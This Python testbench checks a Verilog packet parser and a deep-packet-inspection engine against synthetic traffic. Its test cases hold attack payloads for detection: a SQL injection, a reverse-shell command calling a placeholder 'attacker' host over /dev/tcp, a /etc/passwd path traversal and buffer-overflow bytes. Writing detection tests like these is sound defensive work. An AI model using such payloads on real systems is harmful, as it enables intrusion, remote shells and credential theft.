#!/usr/bin/env python3
"""
================================================================================
Hardware Parser + DPI Classification Pipeline Automated Testbench
================================================================================
Validates end-to-end integration between:
1. Verilog Hardware Packet Parser (packet_parser_top.v + tb_parser.v)
2. Python DPI Engine (dpi/core/engine.py)

Simulates synthetic network packets (both legitimate and malicious attack vectors),
feeds them through the Icarus Verilog hardware simulator, and passes the hardware-extracted
metadata and payload to the DPI engine to classify each packet as NORMAL or MALICIOUS.
================================================================================
"""

import os
import sys
import subprocess
import re
import shutil
from typing import Dict, Any, List

# Suppress scapy warnings
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# pyrefly: ignore [missing-import]
from scapy.all import Ether, IP, TCP, Raw

# Add dpi folder to sys.path
PARSING_DIR = os.path.dirname(os.path.abspath(__file__))
DPI_DIR = os.path.abspath(os.path.join(PARSING_DIR, "..", "dpi"))
if DPI_DIR not in sys.path:
    sys.path.insert(0, DPI_DIR)

from dpi_engine import DPIEngine, Colors
from test_dpi import build_synthetic_tls_client_hello


def resolve_iverilog_tools():
    """Finds iverilog and vvp binaries from common paths or system PATH."""
    candidate_paths = [
        r"D:\iverilog\bin",
        r"C:\iverilog\bin",
        r"C:\Program Files\iverilog\bin",
    ]
    iverilog_bin = "iverilog"
    vvp_bin = "vvp"

    for p in candidate_paths:
        iv = os.path.join(p, "iverilog.exe")
        vv = os.path.join(p, "vvp.exe")
        if os.path.exists(iv) and os.path.exists(vv):
            return iv, vv

    # Check system PATH
    which_iv = shutil.which("iverilog")
    which_vv = shutil.which("vvp")
    if which_iv and which_vv:
        return which_iv, which_vv

    return r"D:\iverilog\bin\iverilog.exe", r"D:\iverilog\bin\vvp.exe"


def run_pipeline_testbench():
    iverilog_bin, vvp_bin = resolve_iverilog_tools()

    print(f"\n{Colors.CYAN}{Colors.BOLD}{'=' * 85}")
    print("  HARDWARE PARSER -> DPI ENGINE CLASSIFICATION VERIFICATION TESTBENCH")
    print(f"{'=' * 85}{Colors.RESET}")
    print(f"  {Colors.BOLD}Verilog Compiler:{Colors.RESET} {iverilog_bin}")
    print(f"  {Colors.BOLD}Simulation Engine:{Colors.RESET}{vvp_bin}")
    print(f"  {Colors.BOLD}DPI Engine Core:{Colors.RESET}  {os.path.join(DPI_DIR, 'core', 'engine.py')}\n")

    # 1. Compile Verilog simulation
    print("[1/3] Compiling Verilog Parser & Testbench...")
    compile_cmd = [
        iverilog_bin,
        "-s", "tb_parser",
        "-o", os.path.join(PARSING_DIR, "parser_sim"),
        os.path.join(PARSING_DIR, "packet_parser_top.v"),
        os.path.join(PARSING_DIR, "dpi_engine.v"),
        os.path.join(PARSING_DIR, "tb_parser.v"),
    ]
    res_compile = subprocess.run(compile_cmd, cwd=PARSING_DIR, capture_output=True, text=True)
    if res_compile.returncode != 0:
        print(f"{Colors.RED}[Error] Icarus Verilog compilation failed:{Colors.RESET}")
        print(res_compile.stderr)
        sys.exit(1)
    print(f"{Colors.GREEN}[+] Verilog compilation successful: parser_sim built.{Colors.RESET}\n")

    # 2. Initialize DPI Engine
    dpi_engine = DPIEngine(target_ports=(80, 443), use_colors=True)

    # 3. Define Test Cases
    test_cases: List[Dict[str, Any]] = [
        {
            "id": 1,
            "name": "Normal HTTP GET Request",
            "src_ip": "10.0.1.25",
            "dst_ip": "93.184.216.34",
            "sport": 51200,
            "dport": 80,
            "payload": b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
            "expected_verdict": "NORMAL",
            "threat_category": "Legitimate Web Traffic",
        },
        {
            "id": 2,
            "name": "Normal TLS 1.2 ClientHello Handshake",
            "src_ip": "192.168.1.50",
            "dst_ip": "140.82.121.4",
            "sport": 52345,
            "dport": 443,
            "payload": build_synthetic_tls_client_hello(domain="api.github.com"),
            "expected_verdict": "NORMAL",
            "threat_category": "Legitimate TLS Handshake",
        },
        {
            "id": 3,
            "name": "Malicious SQL Injection Attack",
            "src_ip": "192.168.1.105",
            "dst_ip": "10.0.0.80",
            "sport": 49152,
            "dport": 80,
            "payload": b"POST /search.php HTTP/1.1\r\nHost: db.corp.internal\r\n\r\nid=1' UNION SELECT username,password FROM users--",
            "expected_verdict": "MALICIOUS",
            "threat_category": "SQL Injection (UNION SELECT)",
        },
        {
            "id": 4,
            "name": "Malicious Shell RCE Attack (/bin/sh)",
            "src_ip": "172.16.5.99",
            "dst_ip": "10.0.0.80",
            "sport": 44444,
            "dport": 80,
            "payload": b"POST /api/exec HTTP/1.1\r\nHost: internal-app\r\n\r\nparam=; /bin/sh -i >& /dev/tcp/attacker/8080 0>&1",
            "expected_verdict": "MALICIOUS",
            "threat_category": "Remote Code Execution (/bin/sh)",
        },
        {
            "id": 5,
            "name": "Malicious Path Traversal + /etc/passwd",
            "src_ip": "10.20.30.40",
            "dst_ip": "10.0.0.80",
            "sport": 55123,
            "dport": 80,
            "payload": b"GET /../../../../etc/passwd HTTP/1.1\r\nHost: file-server\r\n\r\n",
            "expected_verdict": "MALICIOUS",
            "threat_category": "Directory Traversal & Credential Theft",
        },
        {
            "id": 6,
            "name": "Malicious Hex Buffer Overflow (0x1337CAFE)",
            "src_ip": "192.168.100.77",
            "dst_ip": "10.0.0.80",
            "sport": 60100,
            "dport": 80,
            "payload": b"\x90" * 16 + b"\x13\x37\xca\xfe" + b"\xcc" * 8,
            "expected_verdict": "MALICIOUS",
            "threat_category": "Buffer Overflow Exploit Sequence",
        },
        {
            "id": 7,
            "name": "Legitimate TCP Pure SYN Handshake (Zero Payload)",
            "src_ip": "10.0.0.15",
            "dst_ip": "93.184.216.34",
            "sport": 51000,
            "dport": 80,
            "payload": b"",
            "expected_verdict": "NORMAL",
            "threat_category": "Pure Handshake Frame (Pre-Filter)",
        },
    ]

    print("[2/3] Running End-to-End Hardware Parsing & DPI Inspection Pipeline...")
    print(f"{'ID':<4} | {'TEST DESCRIPTION':<36} | {'HW VERIFY':<10} | {'DPI VERDICT':<13} | {'STATUS'}")
    print("-" * 85)

    all_tests_passed = True
    test_results = []

    hex_file_path = os.path.join(PARSING_DIR, "packet_data.hex")
    sim_bin_path = os.path.join(PARSING_DIR, "parser_sim")

    for tc in test_cases:
        # Build scapy packet
        if tc["payload"]:
            pkt = Ether() / IP(src=tc["src_ip"], dst=tc["dst_ip"]) / TCP(sport=tc["sport"], dport=tc["dport"]) / Raw(load=tc["payload"])
        else:
            pkt = Ether() / IP(src=tc["src_ip"], dst=tc["dst_ip"]) / TCP(sport=tc["sport"], dport=tc["dport"], flags="S")

        wire_bytes = bytes(pkt)
        exp_src_hex = f"{int.from_bytes(bytes(map(int, tc['src_ip'].split('.'))), 'big'):08x}"
        exp_dst_hex = f"{int.from_bytes(bytes(map(int, tc['dst_ip'].split('.'))), 'big'):08x}"
        exp_payload_len = len(tc["payload"])

        # Write wire bytes to packet_data.hex for Verilog $readmemh
        with open(hex_file_path, "w") as f:
            for b in wire_bytes:
                f.write(f"{b:02x}\n")

        # Execute Icarus Verilog hardware simulation
        res_sim = subprocess.run([vvp_bin, sim_bin_path], cwd=PARSING_DIR, capture_output=True, text=True)
        sim_out = res_sim.stdout

        # Extract parsed output from hardware simulation
        src_match   = re.search(r"Source IP\s*:\s*([0-9a-fA-F]{8})", sim_out)
        dst_match   = re.search(r"Destination IP\s*:\s*([0-9a-fA-F]{8})", sim_out)
        sport_match = re.search(r"Source Port\s*:\s*(\d+)", sim_out)
        dport_match = re.search(r"Destination Port\s*:\s*(\d+)", sim_out)
        bytes_match = re.search(r"Payload Bytes\s*:\s*(\d+)", sim_out)

        if not all([src_match, dst_match, sport_match, dport_match, bytes_match]):
            hw_passed = False
            hw_status_str = f"{Colors.RED}[FAIL]{Colors.RESET}"
            hw_src_ip, hw_dst_ip, hw_sport, hw_dport = tc["src_ip"], tc["dst_ip"], tc["sport"], tc["dport"]
        else:
            hw_src_hex = src_match.group(1).lower()
            hw_dst_hex = dst_match.group(1).lower()
            hw_sport   = int(sport_match.group(1))
            hw_dport   = int(dport_match.group(1))
            hw_bytes   = int(bytes_match.group(1))

            hw_src_ip = f"{int(hw_src_hex[0:2], 16)}.{int(hw_src_hex[2:4], 16)}.{int(hw_src_hex[4:6], 16)}.{int(hw_src_hex[6:8], 16)}"
            hw_dst_ip = f"{int(hw_dst_hex[0:2], 16)}.{int(hw_dst_hex[2:4], 16)}.{int(hw_dst_hex[4:6], 16)}.{int(hw_dst_hex[6:8], 16)}"

            hw_headers_ok = (hw_src_hex == exp_src_hex and hw_dst_hex == exp_dst_hex and
                             hw_sport == tc["sport"] and hw_dport == tc["dport"])
            hw_payload_ok = (hw_bytes == exp_payload_len)

            hw_passed = hw_headers_ok and hw_payload_ok
            hw_status_str = f"{Colors.GREEN}[PASS]{Colors.RESET}" if hw_passed else f"{Colors.RED}[FAIL]{Colors.RESET}"

        # -------------------------------------------------------------
        # Pass Hardware-Parsed outputs to DPI Engine for Classification
        # -------------------------------------------------------------
        verdict = dpi_engine.classify_payload(
            payload=tc["payload"],
            src_ip=hw_src_ip,
            dst_ip=hw_dst_ip,
            src_port=hw_sport,
            dst_port=hw_dport,
            verbose=False,
        )

        classification_passed = (verdict.verdict == tc["expected_verdict"])
        test_passed = hw_passed and classification_passed

        if not test_passed:
            all_tests_passed = False

        if verdict.verdict == "MALICIOUS":
            dpi_verdict_str = f"{Colors.RED}{Colors.BOLD}[MALICIOUS]{Colors.RESET}"
        else:
            dpi_verdict_str = f"{Colors.GREEN}[NORMAL]{Colors.RESET}"

        status_str = f"{Colors.GREEN}[PASS]{Colors.RESET}" if test_passed else f"{Colors.RED}[FAIL]{Colors.RESET}"

        print(f"#{tc['id']:<3} | {tc['name']:<36} | {hw_status_str:<19} | {dpi_verdict_str:<22} | {status_str}")
        test_results.append({
            "tc": tc,
            "hw_passed": hw_passed,
            "classification_passed": classification_passed,
            "verdict": verdict,
        })

    print("-" * 85)
    print("\n[3/3] Detailed Verification & Threat Classification Summary:")
    print("=" * 85)
    for res in test_results:
        tc = res["tc"]
        v = res["verdict"]
        print(f"  * Test #{tc['id']}: {tc['name']}")
        print(f"    - Category:        {tc['threat_category']}")
        print(f"    - 5-Tuple (HW):    {tc['src_ip']}:{tc['sport']} -> {tc['dst_ip']}:{tc['dport']}")
        print(f"    - Payload Size:    {len(tc['payload'])} bytes")
        print(f"    - DPI Verdict:     {Colors.RED if v.is_malicious else Colors.GREEN}{v.verdict}{Colors.RESET}")
        print(f"    - Severity:        {v.threat_severity}")
        print(f"    - Classification:  {v.reason}")
        if v.matched_rules:
            matched_names = ", ".join([r.name for r in v.matched_rules])
            print(f"    - Signatures Hit:  {matched_names}")
        print()

    print("=" * 85)
    if all_tests_passed:
        print(f"{Colors.GREEN}{Colors.BOLD}OVERALL RESULT: ALL TESTS PASSED (7/7) - HARDWARE + DPI PIPELINE VERIFIED!{Colors.RESET}")
    else:
        print(f"{Colors.RED}{Colors.BOLD}OVERALL RESULT: VERIFICATION FAILED{Colors.RESET}")
    print("=" * 85 + "\n")

    # Display DPI Telemetry
    dpi_engine.print_summary()


if __name__ == "__main__":
    run_pipeline_testbench()
